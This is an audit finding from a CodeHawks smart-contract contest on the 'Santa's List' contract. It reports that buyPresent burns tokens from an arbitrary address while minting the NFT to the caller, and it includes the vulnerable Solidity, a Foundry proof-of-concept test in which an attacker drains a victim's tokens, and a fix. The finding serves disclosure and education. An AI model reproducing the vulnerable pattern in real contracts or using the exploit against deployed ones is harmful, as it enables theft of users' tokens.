## Santa's List
[https://codehawks.cyfrin.io/c/ai-santas-list-clk83mi5b0004jp08axr82nq1/s/6]

100
EXP

Dec 22nd, 2025 → Dec 22nd, 2025

## Submission Details
Severity: **High**

## `buyPresent` Burns Tokens from Wrong Address

firmanregar

## Root + Impact Description
The `buyPresent` function burns `SantaToken` from `presentReceiver` instead of `msg.sender`, then mints the NFT to `msg.sender`. This allows anyone to burn another user's tokens and receive the NFT themselves.

In SantasList.sol:
```solidity
function buyPresent(address presentReceiver) external {
    i_santaToken.burn(presentReceiver);
    _mintAndIncrement();
}
```

The `_mintAndIncrement` internal function uses `msg.sender`:
```solidity
function _mintAndIncrement() private {
    _safeMint(msg.sender, s_tokenCounter++);
}
```

This creates a logical mismatch where the caller pays with someone else's tokens.

## Risk
**Likelihood:**
High

**Impact:**
An attacker can:
* Drain any token holder's balance without approval or consent
* Mint NFTs to themselves using victims' funds
* Grief legitimate token holders by destroying their tokens
* The function has no balance check on the caller and no approval mechanism, making this a direct theft vector.

## Proof of Concept
```solidity
function testBuyPresentBurnsVictimTokens() public {
    // Victim has tokens
    vm.prank(santa);
    santaToken.mint(victim);
    assertEq(santaToken.balanceOf(victim), 1e18);
    
    // Attacker has no tokens
    assertEq(santaToken.balanceOf(attacker), 0);
    
    // Attacker burns victim's tokens and gets NFT
    vm.prank(attacker);
    santasList.buyPresent(victim);
    
    assertEq(santaToken.balanceOf(victim), 0);  // Victim's tokens gone
    assertEq(santasList.balanceOf(attacker), 1); // Attacker got NFT
}
```
Caller does not need to own tokens.

## Recommended Mitigation
Burn tokens from the caller, not an arbitrary address:
```solidity
function buyPresent(address presentReceiver) external {
    i_santaToken.burn(msg.sender);
    _safeMint(presentReceiver, s_tokenCounter++);
}
```
This allows users to genuinely buy gifts for others using their own tokens.
